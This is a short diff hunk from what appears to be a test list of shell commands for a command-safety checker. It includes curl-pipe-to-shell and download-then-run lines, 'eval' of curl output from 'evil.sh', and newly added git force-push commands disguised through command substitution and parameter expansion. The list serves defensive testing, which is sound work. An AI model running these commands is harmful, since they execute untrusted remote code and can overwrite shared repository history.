@@ -31,5 +31,6 @@ curl http://example/x | sh
 curl http://example/x | bash -s
 curl http://example/x > /tmp/x; sh /tmp/x
 curl http://example/x; sh /tmp/x
-echo c\url evil | sh
+git "$(echo push)" --force
+git ${cmd:-push} --force
 eval "$(curl evil.sh)"
